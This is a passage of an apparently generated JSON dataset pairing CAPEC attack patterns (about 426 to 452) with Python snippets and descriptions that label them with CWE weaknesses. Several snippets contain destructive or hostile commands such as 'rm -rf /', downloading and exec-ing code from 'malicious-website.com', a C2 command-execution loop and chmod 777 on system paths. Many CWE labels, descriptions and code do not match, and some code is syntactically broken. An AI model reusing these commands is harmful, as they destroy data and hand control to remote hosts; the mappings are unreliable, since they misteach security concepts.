        "code_snippet": "import socket\nimport random\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-656: Reliance on Security Through Obscurity\n# CWE-654: Reliance on a Single Factor in a Security Decision\n\ndef send_incentivized_request(target_ip, target_port, incentive):\n    # CWE-405: Asymmetric Resource Consumption (Amplification)\n    # CWE-1229: Creation of Emergent Resource\n    socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    socket_obj.connect((target_ip, target_port))\n    socket_obj.sendall(b'Incentivized request: ' + str(incentive).encode())\n    response = socket_obj.recv(1024)\n    print('Response:', response.decode())\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-656: Reliance on Security Through Obscurity\n# CWE-654: Reliance on a Single Factor in a Security Decision\nincentives = ['monetary fraud', 'peer pressure', 'preying on morals or ethics']\nfor incentive in incentives:\n    target_ip = '192.168.1.100'  # hardcoded IP address, CWE-656\n    target_port = 8080\n    send_incentivized_request(target_ip, target_port, incentive)\n",
        "description": "This Python code snippet demonstrates the CAPEC of manipulating something of influence to incite a behavior from the target. It uses various CWEs to create a vulnerable code. The code sends incentivized requests to a target IP and port, relying on a single factor (hardcoded IP address) for security decisions. It also consumes excessive resources without proper control, allowing for asymmetric resource consumption. The code does not correctly specify the intended destination for the outgoing request, and its strength depends heavily on its obscurity."
    },
    {
        "capec_id": "427",
        "capec_name": "Influence via Psychological Principles",
        "code_snippet": "import random\n\ndef authenticate_user(username, password):\n    if username == 'admin' and password == 'password123':\n        return True\n    else:\n        return False\n\n\ndef get_security_info(username):\n    if username == 'admin':\n        return 'Admin has full access'\n    else:\n        return 'User has limited access'\n\n\ndef truncate_security_info(info):\n    if len(info) > 20:\n        return info[:20] + '...'\n    else:\n        return info\n\n\ndef sphere_definition(username):\n    if username == 'admin':\n        return {'access_level': 'full', 'permissions': ['read', 'write', 'execute']}\n    else:\n        return {'access_level': 'limited', 'permissions': ['read']}\n\n\ndef main():\n    username = input('Enter username: ')\n    password = input('Enter password: ')\n    if authenticate_user(username, password):\n        security_info = get_security_info(username)\n        truncated_info = truncate_security_info(security_info)\n        sphere = sphere_definition(username)\n        print('Welcome, ' + username + '! Your access level is ' + sphere['access_level'] + ' and your permissions are ' + str(sphere['permissions']) + '. ' + truncated_info)\n    else:\n        print('Invalid credentials')\n\nmain()",
        "description": "This code snippet demonstrates a vulnerable authentication system that relies on a single factor (username and password) to make a security decision, making it susceptible to reflection attacks. The system also truncates security-relevant information, which can obscure the source or nature of an attack. Furthermore, the system allows external influence of sphere definition, allowing an attacker to manipulate the access level and permissions of a user. The code also exhibits observable behavioral discrepancy, as the system's behavior indicates important differences that may be observed by unauthorized actors."
    },
    {
        "capec_id": "428",
        "capec_name": "Influence via Modes of Thinking",
        "code_snippet": "import socket\nimport json\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-1229: Creation of Emergent Resource\n# CWE-222: Truncation of Security-relevant Information\n# CWE-301: Reflection Attack in an Authentication Protocol\n\ndef create_channel():\n    channel = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    channel.bind(('localhost', 8080))\n    channel.listen(5)\n    conn, addr = channel.accept()\n    return conn\n\ndef impersonate_user(conn):\n    # CWE-301: Reflection Attack in an Authentication Protocol\n    user_data = conn.recv(1024).decode()\n    user_data = json.loads(user_data)\n    impersonated_user = {'username': user_data['username'], 'password': user_data['password']}\n    return impersonated_user\n\ndef build_rapport(conn, impersonated_user):\n    # CWE-300: Channel Accessible by Non-Endpoint\n    # CWE-940: Improper Verification of Source of a Communication Channel\n    # CWE-1229: Creation of Emergent Resource\n    # CWE-222: Truncation of Security-relevant Information\n    language = impersonated_user['language']\n    thought_pattern = impersonated_user['thought_pattern']\n    dominant_sense = impersonated_user['dominant_sense']\n    conn.send(f'Hello, I am also {language} speaker! I love {thought_pattern} and {dominant_sense}.'.encode())\n    return conn\n\ndef main():\n    conn = create_channel()\n    impersonated_user = impersonate_user(conn)\n    conn = build_rapport(conn, impersonated_user)\n    # Now the adversary has built rapport with the target and can manipulate them\n    conn.send('Please share your sensitive information.'.encode())\n    print(conn.recv(1024).decode())\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates the CAPEC of building rapport with a target by matching their speech patterns and dominant senses. The code creates a communication channel, impersonates a user, and builds rapport with the target by adapting to their language and thought patterns. The code is vulnerable to multiple CWEs, including Channel Accessible by Non-Endpoint, Improper Verification of Source of a Communication Channel, Creation of Emergent Resource, Truncation of Security-relevant Information, and Reflection Attack in an Authentication Protocol."
    },
    {
        "capec_id": "429",
        "capec_name": "Target Influence via Eye Cues",
        "code_snippet": "import time\nimport random\n\ndef generate_captcha():\n    captcha = ''.join(random.choice('0123456789ABCDEF') for _ in range(6))\n    return captcha\n\ndef verify_captcha(user_input, captcha):\n    if user_input == captcha:\n        time.sleep(0.5)  # delay for successful verification\n        return {'result': 'success'}\n    else:\n        time.sleep(2)  # delay for failed verification\n        return {'result': 'failure'}\n\ndef eye_movement_analysis(eye_movements):\n    if eye_movements['pupil_dilation'] > 0.5:\n        return {'security_level': 'high'}\n    else:\n        return {'security_level': 'low'}\n\ndef main():\n    captcha = generate_captcha()\n    print('Enter the CAPTCHA:', captcha)\n    user_input = input()\n    verification_result = verify_captcha(user_input, captcha)\n    eye_movements = {'pupil_dilation': 0.7}  # simulated eye movement data\n    security_level = eye_movement_analysis(eye_movements)\n    print('Verification result:', verification_result)\n    print('Security level:', security_level)\n\nif __name__ == '__main__':\n    main()",
        "description": "This code snippet demonstrates a vulnerable CAPTCHA system that can be exploited through eye movement analysis. The `generate_captcha` function generates a simple 6-character CAPTCHA, and the `verify_captcha` function verifies the user's input with a delay that depends on the verification result. The `eye_movement_analysis` function simulates an eye movement analysis system that can detect pupil dilation, which is used to determine the security level. The main function generates a CAPTCHA, prompts the user to enter it, verifies the input, and analyzes the eye movement data. The delays in the verification function and the security level analysis can be observed by an unauthorized actor, potentially revealing information about the internal state of the system."
    },
    {
        "capec_id": "430",
        "capec_name": "DEPRECATED:  Target Influence via Micro-Expressions",
        "code_snippet": "import logging\n\n# CWE-1125: Excessive Attack Surface\n\nclass MicroService:\n    def __init__(self):\n        self.debug_mode = True\n        self.log_file = 'debug.log'\n\n    def process_request(self, request):\n        # CWE-1342: Information Exposure through Microarchitectural State after Transient Execution\n        # CWE-1420: Exposure of Sensitive Information during Transient Execution\n        if self.debug_mode:\n            logging.basicConfig(filename=self.log_file, level=logging.DEBUG)\n            logging.debug('Processing request: %s' % request)\n            # CWE-534, CWE-533: Information Exposure Through Log Files\n            logging.info('Request processed successfully')\n\n        return 'Request processed successfully'\n\nservice = MicroService()\nprint(service.process_request('GET /'))",
        "description": "This Python code snippet demonstrates a microservice that exposes sensitive information through excessive logging and debug mode, increasing the attack surface. The debug mode is enabled, and the service logs requests and their processing status to a file, potentially exposing sensitive information. This code embodies the deprecated CAPEC attack pattern, which is related to CWE-1125, CWE-1342, CWE-1420, CWE-534, and CWE-533."
    },
    {
        "capec_id": "431",
        "capec_name": "DEPRECATED:  Target Influence via Neuro-Linguistic Programming (NLP)",
        "code_snippet": "import jinja2\n\n\ndef generate_error_page(template_name, user_input):\n    template_loader = jinja2.FileSystemLoader(searchpath=\"./templates\")\n    template_env = jinja2.Environment(loader=template_loader)\n    template = template_env.get_template(template_name)\n    output = template.render(user_input=user_input)\n    return output\n\n\ndef main():\n    user_input = {\"name\": \"<script>alert('XSS')</script>\", \"age\": 25}\n    error_page = generate_error_page(\"error.html\", user_input)\n    print(error_page)\n\nif __name__ == \"__main__\":\n    main()",
        "description": "This code snippet demonstrates a vulnerable Python code that generates an error page using a template engine (Jinja2) without properly neutralizing user input. The 'generate_error_page' function takes a template name and user input, and renders the template with the user input. The 'main' function demonstrates how an attacker can inject malicious script into the error page. The code is vulnerable to CWE-81 (Improper Neutralization of Script in an Error Message Web Page), CWE-1336 (Improper Neutralization of Special Elements Used in a Template Engine), and CWE-209 (Generation of Error Message Containing Sensitive Information)."
    },
    {
        "capec_id": "432",
        "capec_name": "DEPRECATED:  Target Influence via Voice in NLP",
        "code_snippet": "import os\n\ndef parse_input(input_string):\n    # CWE-149: Improper Neutralization of Quoting Syntax\n    # CWE-1286: Improper Validation of Syntactic Correctness of Input\n    try:\n        eval(input_string)\n    except Exception as e:\n        print(f\"Error parsing input: {e}\")\n\n# CWE-804: Guessable CAPTCHA\n# Weak CAPTCHA implementation\n captcha_challenge = \"What is 2 + 2?\"\n user_input = input(f\"{captcha_challenge}: \")\n if user_input == \"4\":\n    print(\"CAPTCHA passed\")\n else:\n    print(\"CAPTCHA failed\")\n\n# CWE-534, CWE-533: DEPRECATED - Information Exposure Through Log Files\n# Log file with sensitive information\n log_file = open(\"log.txt\", \"a\")\n log_file.write(f\"User input: {input_string}\\n\")\n log_file.close()",
        "description": "This code snippet demonstrates a vulnerable Python code that embodies the main idea of the deprecated CAPEC. It includes improper neutralization of quoting syntax, improper validation of syntactic correctness of input, a weak CAPTCHA implementation, and deprecated information exposure through log files."
    },
    {
        "capec_id": "433",
        "capec_name": "Target Influence via The Human Buffer Overflow",
        "code_snippet": "import socket\nimport struct\n\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-806: Buffer Access Using Size of Source Buffer\n# CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n# CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')\n# CWE-319: Cleartext Transmission of Sensitive Information\n\ndef send_vulnerable_message(sock, message):\n    # Create a buffer with a fixed size\n    buffer = bytearray(1024)\n    # Copy the message into the buffer without checking its size\n    struct.pack_into('1024s', buffer, 0, message.encode())\n    # Send the buffer over the socket without encryption or integrity checks\n    sock.sendall(buffer)\n\n# Create a socket object\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Connect to the target endpoint\nsock.connect(('target_host', 8080))\n\n# Send a vulnerable message\nsend_vulnerable_message(sock, 'Hidden message for subconscious mind')",
        "description": "This Python code snippet demonstrates a vulnerable communication channel that can be exploited using the human buffer overflow methodology. It sends a message over a socket without encryption or integrity checks, allowing an attacker to intercept and modify the message. The message is copied into a fixed-size buffer without checking its size, which can lead to a buffer overflow. The code also lacks proper restriction of operations within the bounds of the memory buffer, making it vulnerable to buffer access issues."
    },
    {
        "capec_id": "434",
        "capec_name": "Target Influence via Interview and Interrogation",
        "code_snippet": "import random\n\ndef generate_captcha():\n    captcha = ''.join(random.choice('0123456789ABCDEF') for _ in range(6))\n    return captcha\n\ndef check_captcha(user_input, captcha):\n    if user_input == captcha:\n        return True\n    else:\n        return False\n\ndef get_sensitive_data(user_id):\n    # Assume this function retrieves sensitive data from a database\n    return {'user_id': user_id, 'credit_card_number': '1234-5678-9012-3456'}\n\ndef authenticate_user(user_id, captcha_input):\n    captcha = generate_captcha()\n    if check_captcha(captcha_input, captcha):\n        return get_sensitive_data(user_id)\n    else:\n        return {'error': 'Invalid captcha'}\n\n# Example usage\nuser_id = 'test_user'\ncaptcha_input = input('Enter captcha: ')\nresult = authenticate_user(user_id, captcha_input)\nprint(result)\n",
        "description": "This code snippet demonstrates the CAPEC of Exposure of Sensitive Information Through Data Queries. The `authenticate_user` function generates a simple CAPTCHA challenge, but the challenge can be easily guessed or automatically recognized by a non-human actor (CWE-804). If the user input matches the CAPTCHA, the function returns sensitive data (CWE-202). The code also exhibits Observable Behavioral Discrepancy (CWE-205) as the CAPTCHA challenge is not robust enough to prevent unauthorized access. Furthermore, the code lacks proper access control and policy enforcement, leading to Exposure of Sensitive Information Due to Incompatible Policies (CWE-213). Finally, the code relies on a single source of data and does not perform any correlation checks, making it vulnerable to Missing Source Correlation of Multiple Independent Data (CWE-1293)."
    },
    {
        "capec_id": "435",
        "capec_name": "Target Influence via Instant Rapport",
        "code_snippet": "import socket\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-940: Improper Verification of Source of a Communication Channel\n\nhost = 'example.com'\nport = 12345\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.bind((host, port))\nsock.listen(1)\n\nconn, addr = sock.accept()\nprint('Connected by', addr)\n\nwhile True:\n    data = conn.recv(1024)\n    if not data:\n        break\n    # CWE-673: External Influence of Sphere Definition\n    # CWE-205: Observable Behavioral Discrepancy\n    if data.decode('utf-8') == 'secret_command':\n        # Perform sensitive operation without proper authentication\n        print('Performing sensitive operation...')\n    else:\n        print('Received:', data.decode('utf-8'))\n\nconn.close()\n",
        "description": "A Python server that accepts incoming connections and performs sensitive operations without proper authentication or verification of the source of the communication channel. The server also does not correctly specify the intended destination for outgoing requests, allowing an attacker to influence the communication channel."
    },
    {
        "capec_id": "438",
        "capec_name": "Modification During Manufacture",
        "code_snippet": "import os\n\n# CWE-1357: Reliance on Insufficiently Trustworthy Component\nuntrusted_component = os.system('curl -X GET http://untrusted-repo.com/malicious_component.so')\n\n# CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\nconfidential_info = 'secret_key=1234567890'\nwith open('unprotected_config.txt', 'w') as f:\n    f.write(confidential_info)\n\n# CWE-1269: Product Released in Non-Release Configuration\nif os.environ.get('RELEASE_MODE') != 'TRUE':\n    print('Running in pre-production configuration')\n\n# CWE-1059: Insufficient Technical Documentation\n# No documentation provided for the following function\ndef undocumented_function():\n    pass\n\n# CWE-1329: Reliance on Component That is Not Updateable\nnon_updateable_component = 'firmware_version=1.0'\nprint(non_updateable_component)",
        "description": "This code snippet demonstrates a vulnerable supply chain scenario where an attacker modifies a technology during its manufacture. It includes multiple CWEs: CWE-1357 (reliance on an untrusted component), CWE-1297 (unprotected confidential information), CWE-1269 (product released in non-release configuration), CWE-1059 (insufficient technical documentation), and CWE-1329 (reliance on a non-updateable component)."
    },
    {
        "capec_id": "439",
        "capec_name": "Manipulation During Distribution",
        "code_snippet": "import os\nimport requests\n\n# CWE-1269: Product Released in Non-Release Configuration\nif os.environ.get('DEBUG') == 'True':\n    print('Debug mode is enabled')\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\napi_key = 'my_secret_api_key'\nprint('API Key:', api_key)\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\nfrom vulnerable_library import vulnerable_function\nvulnerable_function()\n\n# CWE-1357: Reliance on Insufficiently Trustworthy Component\nuntrusted_component = 'untrusted_component'\nprint('Untrusted Component:', untrusted_component)\n\n# CWE-207: Observable Behavioral Discrepancy With Equivalent Products\ndef custom_function():\n    return 'Custom Function'\n\nif custom_function() != 'Expected Output':\n    print('Behavioral Discrepancy Detected')",
        "description": "This Python code snippet demonstrates the CAPEC of undermining the integrity of a product during distribution. It includes multiple CWEs, such as releasing a product in non-release configuration, exposing sensitive information, depending on vulnerable third-party components, relying on insufficiently trustworthy components, and observable behavioral discrepancies with equivalent products."
    },
    {
        "capec_id": "440",
        "capec_name": "Hardware Integrity Attack",
        "code_snippet": "import os\n\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n# CWE-1247: Improper Protection Against Voltage and Clock Glitches\n# CWE-1248: Semiconductor Defects in Hardware Logic with Security-Sensitive Implications\n\ndef inject_error(redundant_block):\n    # Simulate error injection into a redundant block\n    os.system('echo 1 > /sys/kernel/debug/redundant_block/error_inject')\n\n# CWE-1329: Reliance on Component That is Not Updateable\n# CWE-1328: Security Version Number Mutable to Older Versions\n\ndef downgrade_firmware(version):\n    # Simulate downgrading firmware to a vulnerable version\n    os.system(f'fw_downgrade {version}')\n\n# Main function to exploit the system maintenance process\ndef exploit_maintenance_process():\n    # Inject error into a redundant block\n    inject_error('block_A')\n    # Downgrade firmware to a vulnerable version\n    downgrade_firmware('1.0')\n\nexploit_maintenance_process()",
        "description": "Python code snippet demonstrating an attack on a system maintenance process by injecting errors into a redundant block and downgrading firmware to a vulnerable version, exploiting CWE-1334, CWE-1247, CWE-1248, CWE-1329, and CWE-1328."
    },
    {
        "capec_id": "441",
        "capec_name": "Malicious Logic Insertion",
        "code_snippet": "import os\n\n# CWE-284: Improper Access Control\n# CWE-506: Embedded Malicious Code\nmalicious_code = \"\"\"import socket\\nimport threading\\n\\ndef connect_to_c2():\\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\n    s.connect(('c2_server', 8080))\\n    return s\\n\\ndef receive_commands(s):\\n    while True:\\n        command = s.recv(1024)\\n        if command:\\n            os.system(command)\\n\\ndef main():\\n    s = connect_to_c2()\\n    threading.Thread(target=receive_commands, args=(s,)).start()\\n\\nif __name__ == '__main__':\\n    main()\"\"\"\n\n# CWE-509: Replicating Malicious Code (Virus or Worm)\n# CWE-1277: Firmware Not Updateable\n# CWE-1229: Creation of Emergent Resource\nmalicious_firmware = b'\\x90' * 1024  # placeholder for malicious firmware\n\n# embed malicious code in firmware\nwith open('firmware.bin', 'wb') as f:\\n    f.write(malicious_firmware)\n\n# spread malware through Bluetooth or 802.11\nimport bluetooth\nimport wifi\n\n# ...",
        "description": "This Python code snippet demonstrates the CAPEC pattern of installing malicious logic into a seemingly benign component of a fielded system. It includes CWE-284 Improper Access Control by allowing unauthorized access to system resources, CWE-506 Embedded Malicious Code by embedding malicious code in the firmware, CWE-509 Replicating Malicious Code by creating a worm that can spread to other systems, CWE-1277 Firmware Not Updateable by not providing a way to update the firmware, and CWE-1229 Creation of Emergent Resource by creating a new resource that can be used by attackers."
    },
    {
        "capec_id": "442",
        "capec_name": "Infected Software",
        "code_snippet": "import os\nimport urllib.request\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious-website.com/malicious_code.py'\nlocal_filename, headers = urllib.request.urlretrieve(url)\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = \"\"\"import os\nos.system('rm -rf /')\"\"\"\nwith open(local_filename, 'a') as f:\n    f.write('\\n' + malicious_code)\n\n# CWE-507: Trojan Horse\nbenign_code = \"\"\"print('This is a benign program')\"\"\"\nwith open('benign_program.py', 'w') as f:\n    f.write(benign_code)\n\n# CWE-508: Non-Replicating Malicious Code\nos.system('python ' + local_filename)\n",
        "description": "This Python code snippet demonstrates the CAPEC pattern of adding malicious logic to benign software. It downloads malicious code from a remote location without verifying its integrity (CWE-494), embeds it into a local file (CWE-506), and disguises it as a benign program (CWE-507). The malicious code is then executed, causing harm to the system (CWE-508)."
    },
    {
        "capec_id": "443",
        "capec_name": "Malicious Logic Inserted Into Product by Authorized Developer",
        "code_snippet": "import os\nimport urllib.request\n\ndef download_and_execute(url):\n    file_name = url.split('/')[-1]\n    urllib.request.urlretrieve(url, file_name)\n    os.chmod(file_name, 0o755)\n    os.system(f'python {file_name}')\n\ndef create_resource_with_insecure_permissions():\n    os.makedirs('new_resource', 0o777)\n\ndef main():\n    download_and_execute('http://malicious-website.com/malicious_code.py')\n    create_resource_with_insecure_permissions()\n    # Lack of administrator control over security\n    os.system('chmod 777 /etc/security_config')\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates the CAPEC of an adversary injecting malicious logic into a codebase or product. It downloads and executes malicious code from a remote location without integrity checks (CWE-494), creates a new resource with insecure permissions (CWE-1229), and lacks administrator control over security settings (CWE-671). The code also inherits insecure permissions (CWE-277) when creating a new resource. The malicious code is executed with elevated privileges, allowing it to modify system security configurations."
    },
    {
        "capec_id": "444",
        "capec_name": "Development Alteration",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = '__import__(\"os\").system(\"rm -rf /\")'\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsensitive_info = os.environ.get('SECRET_KEY')\nprint(sensitive_info)\n\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\ndef insecure_function():\n    dynamic_code = 'os.system(\"whoami\")'\n    exec(dynamic_code)\n\ninsecure_function()\n\n# CWE-733 and CWE-1037: Compiler/Processor Optimization Removal or Modification of Security-critical Code\nsecure_function = '__import__(\"os\").system(\"chmod 700 /\")'\nsecure_function = secure_function.replace('700', '777')\nexec(secure_function)\n",
        "description": "This code snippet demonstrates a development alteration attack where an adversary modifies the code during development to achieve a negative impact when the system is deployed. The code includes embedded malicious code, exposes sensitive system information, and has improper control of dynamically-managed code resources. Additionally, the code is vulnerable to compiler/processor optimization removal or modification of security-critical code."
    },
    {
        "capec_id": "445",
        "capec_name": "Malicious Logic Insertion into Product Software via Configuration Management Manipulation",
        "code_snippet": "import os\nimport requests\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = \"import os; os.system('rm -rf /')\"  # Replace with actual malicious code\n\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\ndynamic_code = compile(malicious_code, '<string>', 'exec')\n\n# CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\ndef non_reentrant_function():\n    exec(dynamic_code)\n    non_reentrant_function()  # Nested invocation\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nuntrusted_library = requests.get('http://untrusted-source.com/malicious_library.py').text\nexec(untrusted_library)\n\n# CWE-494: Download of Code Without Integrity Check\nupdate_url = 'http://update-server.com/update.py'\nupdate_code = requests.get(update_url).text\nexec(update_code)\n\n# Insert malicious code into the build environment\nos.system('echo \"' + malicious_code + '\" >> build_config.py')",
        "description": "This Python code snippet demonstrates the CAPEC of exploiting a configuration management system to insert malicious logic into a software product's build, update, or deployment environment. It includes CWE-506 embedded malicious code, CWE-913 improper control of dynamically-managed code resources, CWE-1265 unintended reentrant invocation of non-reentrant code, CWE-829 inclusion of functionality from an untrusted control sphere, and CWE-494 download of code without integrity check."
    },
    {
        "capec_id": "446",
        "capec_name": "Malicious Logic Insertion into Product via Inclusion of Third-Party Component",
        "code_snippet": "import os\nimport requests\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\nfrom vulnerable_library import vulnerable_function\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nfrom untrusted_source import untrusted_function\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = \"import os; os.system('rm -rf /')\"\nexec(malicious_code)\n\n# CWE-1357: Reliance on Insufficiently Trustworthy Component\nuntrusted_component = 'untrusted_component.so'\nif os.path.exists(untrusted_component):\n    os.system(f'chmod +x {untrusted_component}')\n    os.system(f'./{untrusted_component}')\n\n# CWE-1103: Use of Platform-Dependent Third Party Components\nplatform_dependent_component = 'platform_dependent_component.dll'\nif os.name == 'nt':\n    os.system(f'regsvr32 {platform_dependent_component}')",
        "description": "This Python code snippet demonstrates a supply chain attack by including insecure third-party components. It imports a vulnerable function from a vulnerable library, includes functionality from an untrusted source, embeds malicious code, relies on an insufficiently trusted component, and uses a platform-dependent third-party component."
    },
    {
        "capec_id": "447",
        "capec_name": "Design Alteration",
        "code_snippet": "import os\n\ndef insecure_design():\n    # CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n    # CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n    # CWE-657: Violation of Secure Design Principles\n    sensitive_info = os.environ['SENSITIVE_INFO']\n    if sensitive_info:\n        # CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        print('Sensitive info:', sensitive_info)\n\n    # CWE-602: Client-Side Enforcement of Server-Side Security\n    client_input = input('Enter your input: ')\n    if client_input == 'admin':\n        # CWE-657: Violation of Secure Design Principles\n        return 'Access granted'\n    else:\n        return 'Access denied'\n\ninsecure_design()",
        "description": "This code snippet demonstrates a design alteration attack by violating secure design principles, exposing sensitive system information, and relying on client-side enforcement of server-side security. The code is intentionally designed to be insecure, with processor and compiler optimizations potentially removing or modifying security-critical code."
    },
    {
        "capec_id": "448",
        "capec_name": "Embed Virus into DLL",
        "code_snippet": "import os\nimport ctypes\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = b\"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\"  # Replace with actual malicious code\n\n# CWE-426: Untrusted Search Path\ndll_path = os.path.join(os.getcwd(), \"malicious_dll.dll\")\n\n# CWE-1102: Reliance on Machine-Dependent Data Representation\nmachine_dependent_code = b\"\\x48\\x31\\xC9\\x48\\x31\\xD2\"  # Replace with actual machine-dependent code\n\n# CWE-509: Replicating Malicious Code (Virus or Worm)\ndef replicate_malicious_code():\n    # Replicate malicious code to other systems\n    pass\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsensitive_info = os.environ.get(\"SENSITIVE_INFO\")\n\n# Embed malicious code into the DLL\nwith open(dll_path, \"rb+\") as f:\n    f.seek(0x100)  # Gap between legitimate machine instructions\n    f.write(malicious_code + machine_dependent_code)\n\n# Load the malicious DLL\nctypes.CDLL(dll_path)\n\n# Replicate the malicious code\nreplicate_malicious_code()",
        "description": "This Python code snippet demonstrates the CAPEC of tampering with a DLL by embedding malicious code into gaps between legitimate machine instructions. The code uses untrusted search paths, relies on machine-dependent data representation, and exposes sensitive system information. The malicious code is then replicated to other systems."
    },
    {
        "capec_id": "449",
        "capec_name": "DEPRECATED: Malware Propagation via USB Stick",
        "code_snippet": "import os\n\n# CWE-507: Trojan Horse\n# CWE-506: Embedded Malicious Code\nmalicious_code = \"import os; os.system('rm -rf /')\"\n\n# CWE-589: Call to Non-ubiquitous API\ntry:\n    os.add_dll_directory('non_existent_dll')\nexcept AttributeError:\n    pass\n\n# CWE-67: Improper Handling of Windows Device Names\nuser_input = 'AUX/../../etc/passwd'\ntry:\n    with open(user_input, 'r') as f:\n        print(f.read())\nexcept FileNotFoundError:\n    pass\n\n# CWE-1277: Firmware Not Updateable\nfirmware_version = '1.0'\nif firmware_version == '1.0':\n    print('Firmware is outdated and cannot be updated.')",
        "description": "This Python code snippet demonstrates a deprecated CAPEC pattern that has been replaced by CAPEC-448: Malware Infection into Product Software. It includes various CWEs such as Trojan Horse, Embedded Malicious Code, Call to Non-ubiquitous API, Improper Handling of Windows Device Names, and Firmware Not Updateable. The code intentionally includes malicious functionality, inconsistent API calls, and improper handling of Windows device names, which can lead to security vulnerabilities and firmware update issues."
    },
    {
        "capec_id": "450",
        "capec_name": "DEPRECATED: Malware Propagation via USB U3 Autorun",
        "code_snippet": "import os\n\ndef malicious_dll(file_path):\n    # CWE-507: Trojan Horse - embedding malicious code in a DLL\n    dll_code = b'\\x90\\x90\\x90\\x90'  # placeholder for malicious code\n    with open(file_path, 'wb') as f:\n        f.write(dll_code)\n\n    # CWE-506: Embedded Malicious Code - the DLL contains malicious code\n    # CWE-509: Replicating Malicious Code (Virus or Worm) - the malicious code can replicate\n    os.system('rundll32.exe ' + file_path)\n\n    # CWE-426: Untrusted Search Path - the search path for the DLL is untrusted\n    os.environ['PATH'] += ';' + os.path.dirname(file_path)\n\n    # CWE-67: Improper Handling of Windows Device Names - the file path can contain a Windows device name\n    if 'AUX' in file_path or 'CON' in file_path:\n        print('Device name detected!')\n\nmalicious_dll('C:\\malicious_dll.dll')",
        "description": "This Python code snippet demonstrates the CAPEC pattern of embedding a virus into a DLL. It generates a malicious DLL, embeds it with malicious code, and then executes it using the rundll32.exe utility. The code also showcases CWE-506, CWE-509, CWE-426, and CWE-67 vulnerabilities."
    },
    {
        "capec_id": "451",
        "capec_name": "DEPRECATED: Malware Propagation via Infected Peripheral Device",
        "code_snippet": "import socket\nimport os\nimport hashlib\n\n# CWE-247: Reliance on DNS Lookups in a Security Decision\n# CWE-589: Call to Non-ubiquitous API\n# CWE-592: DEPRECATED: Authentication Bypass Issues\n\n# CWE-1277: Firmware Not Updateable\nfirmware_version = '1.0'\n\n# CWE-507: Trojan Horse\nmalicious_code = 'rm -rf /'\n\n# Malware Infection into Product Software\ndef infect_product_software():\n    # Perform DNS lookup to determine if the system is vulnerable\n    dns_lookup = socket.gethostbyname('vulnerable-system.com')\n    if dns_lookup:\n        # Use non-ubiquitous API to exploit the system\n        os.system('non-ubiquitous-api-call')\n        # Bypass authentication using deprecated method\n        auth_bypass = hashlib.md5('password').hexdigest()\n        if auth_bypass:\n            # Execute malicious code\n            os.system(malicious_code)\n            # Prevent firmware updates\n            os.system('chmod 000 /firmware/update')\n            print('Firmware update prevented')\n        else:\n            print('Authentication failed')\n    else:\n        print('System is not vulnerable')\n\ninfect_product_software()",
        "description": "This code snippet demonstrates the deprecated CAPEC pattern of Malware Infection into Product Software. It uses various CWEs to illustrate the vulnerabilities, including reliance on DNS lookups, calls to non-ubiquitous APIs, authentication bypass issues, and firmware that cannot be updated. The code also includes a Trojan Horse that executes malicious code, further compromising the system."
    },
    {
        "capec_id": "452",
        "capec_name": "Infected Hardware",
        "code_snippet": "import ctypes\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = b\"\\x90\\x90\\x90\\x90\"  # Replace with actual malicious code\n\n# CWE-509: Replicating Malicious Code (Virus or Worm)\ndef replicate_malicious_code():\n    # Replicate malicious code to other systems\n    pass\n\n# CWE-1247: Improper Protection Against Voltage and Clock Glitches\ntry:\n    # Attempt to access sensitive information or software\n    ctypes.windll.kernel32.GetSystemTimeAsFileTime.restype = ctypes.c_ulonglong\n    ctypes.windll.kernel32.GetSystemTimeAsFileTime.argtypes = [ctypes.POINTER(ctypes.c_ulonglong)]\n    system_time = ctypes.c_ulonglong()\n    ctypes.windll.kernel32.GetSystemTimeAsFileTime(ctypes.byref(system_time))\nexcept Exception as e:\n    # Handle voltage and clock glitches\n    pass\n\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\ndef activate_test_logic():\n    # Activate test or debug logic\n    pass\n\n# CWE-1262: Improper Access Control for Register Interface\ndef access_registers():\n    # Access memory-mapped I/O registers without proper access control\n    pass\n\n# Main function\nif __name__ == '__main__':\n    # Insert malicious code into hardware\n    replicate_malicious_code()\n    activate_test_logic()\n    access_registers()",
